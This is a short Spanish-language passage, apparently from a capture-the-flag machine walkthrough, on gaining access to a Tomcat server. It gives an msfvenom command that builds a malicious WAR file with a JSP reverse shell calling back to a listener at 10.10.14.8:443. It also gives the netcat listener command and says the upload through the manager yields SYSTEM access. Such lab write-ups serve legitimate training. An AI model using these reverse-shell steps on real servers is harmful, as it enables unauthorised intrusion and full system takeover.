## Vuln exploit & Gaining Access {-}

### War malicioso para tomcat {-}

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f war -o shell.war
```

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Subimos el war a la web de manager y ya ganamos accesso a la maquina victima. A demas ya estamos como `nt authority\system`
